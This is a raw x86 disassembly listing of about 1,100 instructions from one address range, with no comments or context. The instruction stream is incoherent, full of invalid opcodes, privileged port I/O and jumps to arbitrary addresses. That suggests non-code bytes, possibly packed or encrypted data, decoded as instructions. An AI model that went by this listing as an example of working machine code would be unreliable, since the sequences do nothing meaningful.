  4167a4:	sub    DWORD PTR [esi-0x50],0xafe55b7d
  4167ab:	or     ecx,DWORD PTR ds:0xa9f4f73d
  4167b1:	lahf   
  4167b2:	inc    edx
  4167b3:	push   ebp
  4167b4:	test   bl,dl
  4167b6:	(bad)  
  4167b8:	int3   
  4167b9:	imul   edi,DWORD PTR [ecx+0x19],0xffffffc5
  4167bd:	inc    esp
  4167be:	ror    BYTE PTR [edi],0x40
  4167c1:	push   ebx
  4167c2:	das    
  4167c3:	nop
  4167c4:	jp     0x41675a
  4167c6:	pop    edi
  4167c7:	imul   ecx,DWORD PTR [eax+0x464d9bd],0xffffffb2
  4167ce:	xlat   BYTE PTR ds:[ebx]
  4167cf:	xor    eax,0x75816d06
  4167d4:	mov    edx,0x9cb0b9fc
  4167d9:	mov    ds:0x9441769,eax
  4167de:	ret    
  4167df:	ins    BYTE PTR es:[edi],dx
  4167e0:	or     dh,BYTE PTR [ebx+0x31]
  4167e3:	push   0xffffff8f
  4167e5:	ins    BYTE PTR es:[edi],dx
  4167e6:	inc    ecx
  4167e8:	pop    ds
  4167e9:	sahf   
  4167ea:	call   0xf223:0x579fd9f1
  4167f1:	and    edx,DWORD PTR [ebx]
  4167f3:	mov    ds:0x639225e3,eax
  4167f8:	or     DWORD PTR [edi],edi
  4167fa:	add    ecx,DWORD PTR [ebp-0xf01963c]
  416800:	or     BYTE PTR [edi],al
  416802:	mov    DWORD PTR [eax-0x1f3fbdc],0xb2f22a50
  41680c:	imul   ebx,DWORD PTR [edi-0x54],0xffffffab
  416810:	pushf  
  416811:	sar    DWORD PTR [eax+0x7],cl
  416814:	inc    ebp
  416815:	push   esi
  416816:	sbb    edi,edi
  416818:	push   edx
  416819:	xlat   BYTE PTR ds:[ebx]
  41681a:	out    0x77,eax
  41681c:	daa    
  41681d:	int    0x78
  41681f:	les    eax,FWORD PTR [edx]
  416821:	push   ds
  416822:	xchg   ecx,eax
  416823:	sar    DWORD PTR [ecx+edi*8-0x4e],0xc9
  416828:	and    BYTE PTR [ecx-0x48],0x5d
  41682c:	imul   DWORD PTR [edx+ebx*4-0xf]
  416830:	mov    cl,BYTE PTR [ebp-0x7c]
  416833:	xor    DWORD PTR [ecx+0x55d512eb],ecx
  416839:	inc    esi
  41683a:	or     ah,ch
  41683c:	stos   BYTE PTR es:[edi],al
  41683d:	jnp    0x416893
  41683f:	sub    esi,edi
  416841:	pop    ss
  416842:	cmp    bh,al
  416844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416845:	popa   
  416846:	mov    ah,0x1e
  416848:	pop    eax
  41684a:	dec    ecx
  41684b:	neg    DWORD PTR [edx-0x3d0afe6b]
  416851:	dec    ebx
  416852:	adc    al,BYTE PTR [esi-0x28]
  416855:	fsubr  QWORD PTR [ebx-0x7e3eaf96]
  41685b:	pushf  
  41685c:	setne  BYTE PTR [ecx+0x34]
  416860:	pop    ds
  416861:	xor    DWORD PTR [edx-0x69847b44],ebp
  416867:	(bad)
  41686a:	nop
  41686b:	dec    esp
  41686c:	sahf   
  41686d:	pop    esi
  41686e:	or     bh,BYTE PTR [edi+0x625dbb34]
  416874:	pop    ebx
  416875:	arpl   WORD PTR ds:0x8381a1cb,sp
  41687b:	call   0x75f3:0x89ac2ae3
  416882:	jg     0x4168b2
  416884:	cld    
  416885:	cmp    eax,0x6dbba0aa
  41688a:	mov    bh,0x59
  41688c:	sar    DWORD PTR [edi],0x4
  41688f:	leave  
  416890:	xchg   BYTE PTR [edi+0x3a2f9ed3],dh
  416896:	inc    esi
  416897:	and    al,0x62
  416899:	add    dl,cl
  41689b:	leave  
  41689c:	cmp    BYTE PTR [edi-0x63],bl
  41689f:	adc    DWORD PTR [edx],esi
  4168a1:	inc    edx
  4168a2:	mov    ebp,0x15ecf5e3
  4168a7:	mov    ecx,0x7a3fcf3b
  4168ac:	lock push ecx
  4168ae:	shr    BYTE PTR [edi-0x226d2b9c],cl
  4168b4:	lods   al,BYTE PTR ds:[esi]
  4168b5:	addr16 pop esi
  4168b7:	add    ecx,0xffffffae
  4168ba:	adc    al,0x49
  4168bc:	mov    dl,0xcf
  4168be:	js     0x4168aa
  4168c0:	adc    esp,eax
  4168c2:	cmp    ebp,DWORD PTR [edi]
  4168c4:	test   BYTE PTR ds:0xd8052ae6,ch
  4168ca:	sub    dh,BYTE PTR [ebx+eiz*1-0x3d15abc9]
  4168d1:	xchg   esi,eax
  4168d2:	mov    eax,ds:0xb324d127
  4168d7:	in     al,0x3b
  4168d9:	ss (bad) 
  4168db:	adc    al,0xc9
  4168dd:	sbb    ah,ch
  4168df:	(bad)  
  4168e0:	pop    ds
  4168e1:	pop    ss
  4168e2:	leave  
  4168e3:	inc    eax
  4168e4:	jae    0x416891
  4168e6:	repz xchg edx,eax
  4168e8:	xchg   ebx,eax
  4168e9:	pop    esp
  4168ea:	not    DWORD PTR [edx+0x10]
  4168ed:	mov    dl,0xe
  4168ef:	mov    bl,BYTE PTR [ecx-0x32]
  4168f2:	inc    esp
  4168f3:	scas   al,BYTE PTR es:[edi]
  4168f4:	das    
  4168f5:	pop    edi
  4168f6:	sub    ah,BYTE PTR [esi+0x1283d0ab]
  4168fc:	xchg   edi,eax
  4168fd:	inc    esi
  4168fe:	pushf  
  4168ff:	fldcw  WORD PTR ds:0xabb8e899
  416905:	or     dl,BYTE PTR [ecx-0x43]
  416908:	cmp    DWORD PTR [ebp+0x3e864fff],ebp
  41690e:	ror    BYTE PTR [eax+0x59],cl
  416911:	xlat   BYTE PTR ds:[ebx]
  416912:	(bad)  
  416913:	outs   dx,DWORD PTR ds:[esi]
  416914:	xchg   esi,eax
  416915:	lods   eax,DWORD PTR ds:[esi]
  416916:	jmp    0xc76fd1e2
  41691b:	jne    0x416956
  41691d:	pop    ebx
  41691e:	adc    BYTE PTR [ecx-0x44a7a2e9],cl
  416924:	jp     0x416949
  416926:	and    edi,DWORD PTR [ecx-0x1066f7eb]
  41692c:	add    eax,0x64e20669
  416931:	cmp    eax,DWORD PTR [eax]
  416933:	mov    ebx,0x68f462aa
  416938:	sbb    cl,dh
  41693a:	xchg   edx,eax
  41693b:	popf   
  41693c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693d:	inc    esi
  41693e:	scas   al,BYTE PTR es:[edi]
  41693f:	das    
  416940:	push   ecx
  416941:	ss push edx
  416943:	cmp    al,ch
  416945:	pop    eax
  416946:	sub    ch,ah
  416948:	adc    edi,DWORD PTR [eax+0x76]
  41694b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41694c:	dec    DWORD PTR [eax-0x7c]
  41694f:	cmp    al,0x86
  416951:	frstor ds:0xb0c0ad94
  416957:	pop    ebp
  416958:	rol    bl,1
  41695a:	ror    BYTE PTR [ecx+0x69],cl
  41695d:	pop    ebx
  41695e:	xor    al,0x2f
  416960:	stc    
  416961:	int    0xb
  416963:	int3   
  416964:	dec    edx
  416965:	aad    0x97
  416967:	lods   eax,DWORD PTR ds:[esi]
  416968:	jg     0x41696e
  41696a:	iret   
  41696b:	call   0x74092e6e
  416970:	enter  0xe82d,0xcc
  416974:	addr16 jae 0x416929
  416977:	pop    ss
  416978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416979:	or     esp,DWORD PTR [eax-0x13eeeb44]
  41697f:	mov    ds:0xdfe9cb87,al
  416984:	add    al,BYTE PTR [eax]
  416986:	add    ch,dh
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	push   ebp
  416994:	in     eax,0x98
  416996:	mov    esp,0x707f1fa5
  41699b:	mov    ecx,0x4470707e
  4169a0:	cmp    eax,0x6c1e0768
  4169a5:	or     DWORD PTR [ebp+0x9f5893e],edx
  4169ab:	out    0x20,al
  4169ad:	sub    esp,DWORD PTR [edi+esi*2+0x6a]
  4169b1:	or     eax,DWORD PTR [edx-0xe]
  4169b4:	jbe    0x416a1c
  4169b6:	hlt    
  4169b7:	in     eax,dx
  4169b8:	aaa    
  4169b9:	push   0x44a1da56
  4169be:	pop    edx
  4169bf:	(bad)  [edi+0x27]
  4169c2:	hlt    
  4169c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169c4:	cmp    eax,0x148cc42
  4169c9:	push   es
  4169ca:	sbb    eax,0x5973e913
  4169cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169d0:	cmp    eax,esi
  4169d2:	push   ecx
  4169d3:	inc    BYTE PTR [eax-0x3f1dfa8a]
  4169d9:	or     BYTE PTR [ebx+0x3f],ah
  4169dc:	jnp    0x416a56
  4169de:	sbb    ebp,DWORD PTR [edi-0x6c668b08]
  4169e4:	(bad)  
  4169e5:	dec    eax
  4169e6:	dec    ecx
  4169e7:	jns    0x416a04
  4169e9:	retf   0x96a7
  4169ec:	xor    edx,ecx
  4169ee:	stc    
  4169ef:	in     al,0xb4
  4169f1:	dec    ecx
  4169f2:	adc    ebx,edi
  4169f4:	push   ds
  4169f5:	dec    eax
  4169f6:	cmp    ch,BYTE PTR [edi+eiz*1]
  4169f9:	ins    DWORD PTR es:[edi],dx
  4169fa:	imul   esi,ebx,0xa1e2bf53
  416a00:	dec    edi
  416a01:	ss std 
  416a03:	jo     0x41699f
  416a05:	sub    BYTE PTR [ebx+0x630f6ac4],bl
  416a0b:	bound  ebx,QWORD PTR [ebp+ebx*8+0x32]
  416a0f:	hlt    
  416a10:	inc    eax
  416a11:	leave  
  416a12:	xor    DWORD PTR es:[eax-0x7ab783e5],ebx
  416a19:	mov    ds:0x4624c1f4,al
  416a1e:	stos   DWORD PTR es:[edi],eax
  416a1f:	mov    esp,0x636e5
  416a24:	hlt    
  416a25:	or     al,0x6f
  416a27:	sbb    bl,BYTE PTR [edi+ebx*1+0x1b952ba]
  416a2e:	jp     0x4169f9
  416a30:	cs jnp 0x416aab
  416a33:	xor    DWORD PTR [eax],esi
  416a35:	mov    dh,0x41
  416a37:	inc    esp
  416a38:	cwde   
  416a39:	ins    DWORD PTR es:[di],dx
  416a3b:	mov    dl,bl
  416a3d:	enter  0xdf1f,0xa9
  416a41:	push   ebp
  416a42:	mov    al,0x93
  416a44:	xchg   edi,eax
  416a45:	sbb    DWORD PTR [eax+eiz*1],ebx
  416a48:	sbb    ecx,DWORD PTR [edi]
  416a4a:	arpl   cx,ax
  416a4c:	and    cl,BYTE PTR [esi-0xa31acad]
  416a52:	mov    eax,gs:0xb13c57d6
  416a58:	mov    dh,0xbf
  416a5a:	inc    edi
  416a5b:	dec    ebp
  416a5c:	dec    edx
  416a5d:	das    
  416a5e:	test   BYTE PTR [ebp-0x76d95927],0xe8
  416a65:	jmp    0x416a96
  416a67:	inc    ebx
  416a68:	cmp    ch,BYTE PTR [edi+edi*2+0x5]
  416a6c:	(bad)  
  416a6d:	jl     0x416aa8
  416a6f:	jmp    0x5d3e4476
  416a74:	cmp    DWORD PTR [esi-0x380329a3],ebp
  416a7a:	nop
  416a7b:	js     0x416a26
  416a7d:	cwde   
  416a7e:	inc    esi
  416a7f:	jp     0x416a5f
  416a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a82:	sbb    eax,0x1b96aed4
  416a87:	push   0x212a40e
  416a8c:	mov    ch,0x4c
  416a8e:	fwait
  416a8f:	out    dx,eax
  416a90:	mov    DWORD PTR [eax],ecx
  416a92:	hlt    
  416a93:	cmp    eax,0xec164c1b
  416a98:	xlat   BYTE PTR ds:[ebx]
  416a99:	cmp    eax,DWORD PTR [edi]
  416a9b:	in     al,0x24
  416a9d:	sbb    dl,BYTE PTR [edx+edi*8]
  416aa0:	shl    BYTE PTR ss:[eax],0xaf
  416aa4:	and    DWORD PTR [ebp+ebp*8+0xab40b2],ebp
  416aab:	mov    ch,0x82
  416aad:	mov    esi,0xf9c6aea9
  416ab2:	into   
  416ab3:	test   al,0xff
  416ab5:	out    dx,eax
  416ab6:	(bad)  
  416ab7:	sbb    eax,0x37dc9915
  416abc:	adc    edx,DWORD PTR [esi-0x27]
  416abf:	jmp    0x87c9:0x5416c62e
  416ac6:	jl     0x416a8b
  416ac8:	popa   
  416ac9:	out    0xee,eax
  416acb:	mov    eax,ds:0xde940287
  416ad0:	out    dx,eax
  416ad1:	mov    ecx,0xa98a9e07
  416ad6:	ret    0xd660
  416ad9:	ds pushf 
  416adb:	dec    ebx
  416adc:	inc    edi
  416add:	or     dh,BYTE PTR [eax]
  416adf:	mov    esp,0xedffd1ca
  416ae4:	daa    
  416ae5:	ins    DWORD PTR es:[edi],dx
  416ae6:	addr16 inc ebp
  416ae8:	repz fild WORD PTR [ebx+0x1]
  416aec:	cmc    
  416aed:	test   eax,0x67c8076
  416af2:	xchg   ebx,eax
  416af3:	sbb    esp,DWORD PTR [edi]
  416af5:	fcom   QWORD PTR [esi+0xf]
  416af8:	and    al,0x24
  416afa:	xor    DWORD PTR [ebp-0x55],0x1d11eed2
  416b01:	repnz (bad) 
  416b03:	out    0x3c,eax
  416b05:	lea    edi,[ebx-0x494a9fb5]
  416b0b:	push   edi
  416b0c:	(bad)  
  416b0d:	push   ebp
  416b0e:	loopne 0x416aeb
  416b10:	mov    bh,0x57
  416b12:	push   ebp
  416b13:	mov    bh,0xfc
  416b15:	mov    esi,0x41d734f
  416b1a:	sbb    dl,BYTE PTR [ecx]
  416b1c:	mov    eax,0xa8dcc0b5
  416b21:	mov    dl,0x64
  416b23:	shr    BYTE PTR [ebx],cl
  416b25:	data16 sahf 
  416b27:	xchg   ebx,eax
  416b28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b29:	mov    al,0x98
  416b2b:	pop    ss
  416b2c:	int    0xa5
  416b2e:	inc    esi
  416b2f:	sub    DWORD PTR [ebp-0x8375444],ecx
  416b35:	mov    WORD PTR [esi-0x25],es
  416b38:	mov    BYTE PTR [edi-0x5f],cl
  416b3b:	xchg   ecx,eax
  416b3c:	in     al,dx
  416b3d:	add    esi,esp
  416b3f:	mov    ch,0x26
  416b41:	stc    
  416b42:	push   cs
  416b43:	scas   al,BYTE PTR es:[edi]
  416b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b45:	dec    edi
  416b46:	lock or eax,0xa1ef94af
  416b4c:	adc    eax,0x9bbfbe30
  416b51:	xchg   edx,eax
  416b52:	icebp  
  416b53:	pop    ss
  416b54:	sub    BYTE PTR [edi+0x68],bl
  416b57:	sub    al,0x33
  416b59:	gs mov edi,0x82091222
  416b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b60:	push   edi
  416b61:	cdq    
  416b62:	stc    
  416b63:	cdq    
  416b64:	inc    edx
  416b65:	das    
  416b66:	dec    esp
  416b67:	adc    cl,BYTE PTR ds:0xbbd25c24
  416b6d:	rcl    BYTE PTR [ebx],1
  416b6f:	les    ebp,FWORD PTR [ecx]
  416b71:	jle    0x416b46
  416b73:	jnp    0x416b7a
  416b75:	mov    eax,ds:0xcc5cc46d
  416b7a:	addr16 pop edi
  416b7c:	xchg   edx,eax
  416b7d:	test   bl,al
  416b7f:	call   0x551b:0xf1bc4ffd
  416b86:	sub    ebp,DWORD PTR [ecx-0x31]
  416b89:	push   ecx
  416b8a:	add    al,0xde
  416b8c:	dec    ecx
  416b8d:	out    0x6f,al
  416b8f:	neg    BYTE PTR [eax+0x7d]
  416b92:	xlat   BYTE PTR ds:[ebx]
  416b93:	xlat   BYTE PTR ds:[ebx]
  416b94:	xlat   BYTE PTR ds:[ebx]
  416b95:	inc    ecx
  416b96:	ds jne 0x416b6b
  416b99:	add    esi,edx
  416b9b:	sbb    al,0x87
  416b9d:	mov    esp,0xbaae28bb
  416ba2:	inc    esp
  416ba3:	mov    ds:0x2a0d1508,eax
  416ba8:	jb     0x416b5f
  416baa:	jb     0x416b98
  416bac:	mov    esi,0x5bb26ac7
  416bb1:	cmp    al,BYTE PTR [eax+0x339b8289]
  416bb7:	fistp  QWORD PTR [eax-0x47a338a4]
  416bbd:	sbb    al,0x1d
  416bbf:	inc    esp
  416bc0:	stos   DWORD PTR es:[edi],eax
  416bc1:	sub    ax,0xc16f
  416bc5:	std    
  416bc6:	add    eax,0xf60c2ae6
  416bcb:	dec    ecx
  416bcc:	shl    DWORD PTR ds:0xc94275fa,1
  416bd2:	jno    0x416c31
  416bd4:	shl    ebp,1
  416bd6:	cmp    DWORD PTR [edi+ebp*8+0x2f737959],eax
  416bdd:	lea    eax,[esi+ebx*1-0x55ddf56e]
  416be4:	jge    0x416bce
  416be6:	cli    
  416be7:	test   al,0x9b
  416be9:	(bad)  
  416bea:	xchg   edx,eax
  416beb:	add    BYTE PTR [esi*2+0x51b1ebeb],bh
  416bf2:	in     al,dx
  416bf3:	inc    ebx
  416bf4:	and    DWORD PTR [edx],edx
  416bf6:	pop    edx
  416bf7:	sar    esi,1
  416bf9:	mov    ah,0xa0
  416bfb:	idiv   DWORD PTR ds:0xb3f9bbd9
  416c01:	xor    al,0x87
  416c03:	ds aam 0x53
  416c06:	xchg   ebp,eax
  416c07:	into   
  416c08:	mov    BYTE PTR [ebx-0x71],bl
  416c0b:	je     0x416c79
  416c0d:	mov    eax,0xdcbf544f
  416c12:	mov    DWORD PTR [edx],eax
  416c14:	push   ss
  416c15:	ja     0x416b9d
  416c17:	mov    esp,0xaf6d38ec
  416c1c:	mov    bl,0xfb
  416c1e:	sbb    al,0xd3
  416c20:	idiv   ebp
  416c22:	leave  
  416c23:	jmp    0x35b290a3
  416c28:	pusha  
  416c29:	retf   
  416c2a:	xor    al,0x18
  416c2c:	data16 xor BYTE PTR [edi+0x66e7491e],ch
  416c33:	xchg   esi,eax
  416c34:	mov    ?,WORD PTR [ebx-0x176a63e8]
  416c3a:	pop    edi
  416c3b:	push   cs
  416c3c:	ja     0x416c39
  416c3e:	stc    
  416c3f:	push   esi
  416c40:	dec    eax
  416c41:	scas   al,BYTE PTR es:[edi]
  416c42:	test   DWORD PTR [edi+0x5a3ad6d1],esi
  416c48:	cld    
  416c49:	add    esp,esp
  416c4b:	fs mov ah,0xe6
  416c4e:	leave  
  416c4f:	xchg   ebp,eax
  416c50:	sbb    al,0xfc
  416c52:	add    bh,BYTE PTR [ecx+0x710fa385]
  416c58:	mov    ebx,0xe312e9d7
  416c5d:	lea    ebp,[ebp-0x6a]
  416c60:	inc    ecx
  416c61:	mov    edx,0x32e8716a
  416c66:	dec    ecx
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	cmp    al,0x18
  416c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c7e:	fucomip st,st(6)
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416ced
  416c88:	cmp    eax,0x3ee347c5
  416c8d:	sti    
  416c8e:	sub    al,0xa2
  416c90:	(bad)  
  416c91:	out    0xb8,eax
  416c93:	faddp  st(2),st
  416c95:	pusha  
  416c96:	call   0xfa29df6
  416c9b:	es retf 
  416c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c9e:	mov    eax,ds:0x71c5ea42
  416ca3:	dec    esi
  416ca4:	sub    BYTE PTR [ecx-0x5066fbf],ah
  416caa:	cld    
  416cab:	add    al,0xd0
  416cad:	push   0x436639a8
  416cb2:	mov    al,0xe9
  416cb4:	pop    es
  416cb5:	push   eax
  416cb6:	xor    edx,DWORD PTR [ebp+0x164b4c5d]
  416cbc:	jmp    0x7ace8210
  416cc1:	push   edi
  416cc2:	mov    eax,0x72976c32
  416cc7:	mov    WORD PTR [eax+0x26cca850],?
  416ccd:	popw   ds
  416ccf:	dec    ecx
  416cd0:	out    dx,eax
  416cd1:	(bad)  
  416cd3:	mov    cl,0xde
  416cd5:	(bad)  
  416cd6:	mov    ds:0x49ea651f,al
  416cdb:	inc    ebx
  416cdc:	pushf  
  416cdd:	ficom  DWORD PTR [ecx+0x6a0d57bd]
  416ce3:	mov    esp,0x36bbd7b5
  416ce8:	jb     0x416d15
  416cea:	ret    
  416ceb:	or     al,0x51
  416ced:	fdiv   st,st(1)
  416cef:	push   0xffffffbc
  416cf1:	and    bh,BYTE PTR [esi+0x35]
  416cf4:	dec    esi
  416cf5:	aas    
  416cf6:	xor    esi,DWORD PTR [edi+0x12]
  416cf9:	dec    esi
  416cfa:	ror    BYTE PTR [esi+0x2],1
  416cfd:	in     eax,0x9d
  416cff:	mov    DWORD PTR [esi-0x1d],edx
  416d02:	adc    eax,0x7bbbd831
  416d07:	xchg   ah,bl
  416d09:	adc    cl,cl
  416d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d0c:	cmp    ebx,ecx
  416d0e:	mov    cl,0xbd
  416d10:	and    dh,0xfe
  416d13:	push   esp
  416d14:	call   0x7a890f89
  416d19:	sub    bh,dl
  416d1b:	dec    esi
  416d1c:	punpckhwd mm5,QWORD PTR [esi+0x6d]
  416d20:	sbb    BYTE PTR [ecx],ah
  416d22:	out    dx,al
  416d23:	mov    dl,0xd6
  416d25:	jne    0x416cec
  416d27:	fsubr  st(3),st
  416d29:	aaa    
  416d2a:	nop
  416d2b:	jns    0x416cd2
  416d2d:	mov    al,0x93
  416d2f:	cs jp  0x416d73
  416d32:	mov    dl,0x4d
  416d34:	clc    
  416d35:	inc    ebp
  416d36:	push   edi
  416d37:	repz jle 0x416d4b
  416d3a:	xchg   edx,eax
  416d3b:	repnz pop esp
  416d3d:	sub    edi,DWORD PTR [ecx]
  416d3f:	aad    0xf8
  416d41:	rol    dh,cl
  416d43:	and    eax,0x108dc3db
  416d48:	retf   
  416d49:	je     0x416cf6
  416d4b:	pop    ss
  416d4c:	pop    ss
  416d4d:	push   0xb63837e1
  416d52:	dec    edx
  416d53:	cmp    DWORD PTR [ebx+ebp*1+0x57a33d2c],0x4bf903cf
  416d5e:	retf   
  416d5f:	sahf   
  416d60:	popf   
  416d61:	addr16 jmp 0xf75075e7
  416d67:	shr    BYTE PTR [edx+0x144bb8db],0xe9
  416d6e:	test   eax,0x9d0c83c
  416d73:	xchg   DWORD PTR [ebx+ebp*8+0x39],ebx
  416d77:	aad    0x5b
  416d79:	loop   0x416d13
  416d7b:	std    
  416d7c:	or     DWORD PTR [esi],edx
  416d7e:	js     0x416d85
  416d80:	stc    
  416d81:	je     0x416d3d
  416d83:	sar    DWORD PTR [ebx+0xa9a165b],0xd1
  416d8a:	and    al,BYTE PTR [ebx]
  416d8c:	lods   eax,DWORD PTR ds:[esi]
  416d8d:	cld    
  416d8e:	push   cs
  416d8f:	fs xchg esi,eax
  416d91:	out    dx,al
  416d92:	jmp    0xbb2:0x240bf558
  416d99:	xor    bh,al
  416d9b:	xlat   BYTE PTR ds:[ebx]
  416d9c:	jo     0xc9c9ddcc
  416da2:	pop    ecx
  416da3:	push   edx
  416da4:	int3   
  416da5:	fld    QWORD PTR [ebx-0x2c05a2f]
  416dab:	nop
  416dac:	push   edx
  416dad:	aam    0x9
  416daf:	jge    0x416dda
  416db1:	inc    ecx
  416db2:	xlat   BYTE PTR ds:[ebx]
  416db3:	pop    ss
  416db4:	fistp  DWORD PTR [ebx+0x54]
  416db7:	je     0x416d43
  416db9:	jg     0x416da4
  416dbb:	iret   
  416dbc:	mov    ds:0x5d1e4862,al
  416dc1:	dec    edi
  416dc2:	test   BYTE PTR ds:0xca008188,bh
  416dc8:	adc    DWORD PTR [eax-0xe4d332b],0xb7e159ed
  416dd2:	sar    DWORD PTR [esi+ecx*8],0xb8
  416dd6:	dec    ebp
  416dd7:	call   0xd35b7c27
  416ddc:	push   0x78c6859a
  416de1:	das    
  416de2:	loop   0x416db0
  416de4:	rcl    DWORD PTR [ecx],cl
  416de6:	lods   al,BYTE PTR ds:[esi]
  416de7:	retf   0x5bcf
  416dea:	pop    edx
  416deb:	test   DWORD PTR [edx],esi
  416ded:	xlat   BYTE PTR ds:[ebx]
  416dee:	les    esp,FWORD PTR [ecx+0x886dd04]
  416df4:	or     eax,esp
  416df6:	or     eax,0x8eab091
  416dfb:	ss sbb eax,0x1f1d0ce2
  416e01:	leave  
  416e02:	call   0xf2ac9f76
  416e07:	cld    
  416e08:	mov    eax,ds:0x5a9e955a
  416e0d:	push   edi
  416e0e:	pop    ds
  416e0f:	xor    edx,eax
  416e11:	rcl    esp,cl
  416e13:	out    dx,al
  416e14:	dec    eax
  416e15:	(bad)  
  416e16:	xor    bl,cl
  416e18:	mov    bl,0xaf
  416e1a:	xor    DWORD PTR [esi+0x2],ecx
  416e1d:	adc    cl,BYTE PTR [edi-0x448842f7]
  416e23:	xor    DWORD PTR [eax-0x45],ecx
  416e26:	cmc    
  416e27:	xor    ch,BYTE PTR [eax+0x44]
  416e2a:	cmc    
  416e2b:	into   
  416e2c:	mov    gs,WORD PTR [edi-0xb]
  416e2f:	fwait
  416e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e31:	push   esi
  416e32:	xor    BYTE PTR [esp+ecx*1+0x0],0xb7
  416e37:	out    0x13,eax
  416e39:	sbb    DWORD PTR [edx],esi
  416e3b:	xor    al,0x7
  416e3d:	popf   
  416e3e:	or     eax,0xb6656c60
  416e43:	aas    
  416e44:	jmp    0x416dfd
  416e46:	jl     0x416df1
  416e48:	push   0x1d
  416e4a:	ins    DWORD PTR es:[edi],dx
  416e4b:	push   ecx
  416e4c:	xor    esp,DWORD PTR [esi+0x55]
  416e4f:	inc    edx
  416e50:	and    bh,0x48
  416e53:	xchg   ebx,eax
  416e54:	push   ebp
  416e55:	push   ds
  416e56:	pop    edi
  416e57:	jmp    0x416e5b
  416e59:	and    al,0xa4
  416e5b:	pop    ds
  416e5c:	rcl    BYTE PTR [ebx],0xc0
  416e5f:	es call 0x67522840
  416e65:	mov    ebp,0xc16d446b
  416e6a:	xchg   edi,eax
  416e6b:	sub    DWORD PTR [edx+0x4a],eax
  416e6e:	cs std 
  416e70:	mov    edx,0xe7a58eb5
  416e75:	mov    ch,BYTE PTR [edi-0x61a6f30c]
  416e7b:	in     eax,0xa7
  416e7d:	aam    0x8e
  416e7f:	adc    bl,BYTE PTR [ebx+0x233782e]
  416e85:	es push esp
  416e87:	imul   edx,DWORD PTR [esi],0x593a7279
  416e8d:	daa    
  416e8e:	retf   
  416e8f:	and    BYTE PTR [ecx+0x37],ch
  416e92:	push   ebp
  416e93:	mov    esp,0x24fdf120
  416e98:	aas    
  416e99:	and    eax,0x7c46f16
  416e9e:	stc    
  416e9f:	push   esp
  416ea0:	push   es
  416ea1:	sub    DWORD PTR [edi+edi*1],edi
  416ea4:	pop    ebx
  416ea5:	sub    eax,0x26f33a7b
  416eaa:	add    DWORD PTR [eax+0xb],0x7
  416eae:	call   0xb8f8:0xe3745a3c
  416eb5:	mov    ebx,0xe714bada
  416eba:	shl    al,0x37
  416ebd:	ror    DWORD PTR [ecx-0x5e],0x75
  416ec1:	inc    DWORD PTR [ebx]
  416ec3:	xor    DWORD PTR [esi+0x18],eax
  416ec6:	jp     0x416eff
  416ec8:	retf   
  416ec9:	popa   
  416eca:	pop    edi
  416ecb:	mov    dh,BYTE PTR [eax]
  416ecd:	xchg   esp,eax
  416ece:	nop
  416ecf:	xchg   DWORD PTR [ecx],ecx
  416ed1:	adc    al,0x3
  416ed3:	adc    BYTE PTR [eax],cl
  416ed5:	mov    al,0xcc
  416ed7:	mov    cl,dl
  416ed9:	addr16 test eax,0xd5dd2590
  416edf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ee0:	(bad)  
  416ee1:	test   al,0xd1
  416ee3:	sub    cl,BYTE PTR [ebp+0x4b]
  416ee6:	jne    0x416e82
  416ee8:	pop    ecx
  416ee9:	cmp    ch,BYTE PTR [eax]
  416eeb:	add    al,dh
  416eed:	xchg   DWORD PTR [edx+0x47],ebp
  416ef0:	(bad)  
  416ef1:	mov    dl,0x1e
  416ef3:	stos   DWORD PTR es:[edi],eax
  416ef4:	sti    
  416ef5:	scas   al,BYTE PTR es:[edi]
  416ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ef7:	jno    0x416e8f
  416ef9:	lds    edi,FWORD PTR [edi+eiz*8]
  416efc:	pusha  
  416efd:	dec    eax
  416efe:	or     dh,al
  416f00:	nop
  416f01:	mov    cl,0x3a
  416f03:	test   DWORD PTR [ecx-0x5e3cd8b9],esi
  416f09:	les    edx,FWORD PTR ss:0x339bedc4
  416f10:	retf   
  416f11:	sub    DWORD PTR [ecx-0x5e],ebx
  416f14:	or     BYTE PTR [eax-0x69e6e8ef],al
  416f1a:	mov    dl,0x8c
  416f1c:	dec    ebp
  416f1d:	cli    
  416f1e:	push   0x49
  416f20:	mov    BYTE PTR [edx],bh
  416f22:	jbe    0x416f63
  416f24:	push   0x75
  416f26:	ds ins BYTE PTR es:[edi],dx
  416f28:	int3   
  416f29:	enter  0x8299,0xf5
  416f2d:	(bad)  
  416f2e:	mov    edi,0xebf48341
  416f33:	pop    ds
  416f34:	pop    edi
  416f35:	fldcw  WORD PTR [edi+0x72]
  416f38:	mov    fs,WORD PTR [eax]
  416f3a:	jo     0x416f38
  416f3c:	aad    0xb4
  416f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f3f:	std    
  416f40:	push   esi
  416f41:	pop    ebp
  416f42:	inc    ecx
  416f43:	cld    
  416f44:	add    eax,0xeea08f77
  416f49:	scas   al,BYTE PTR es:[edi]
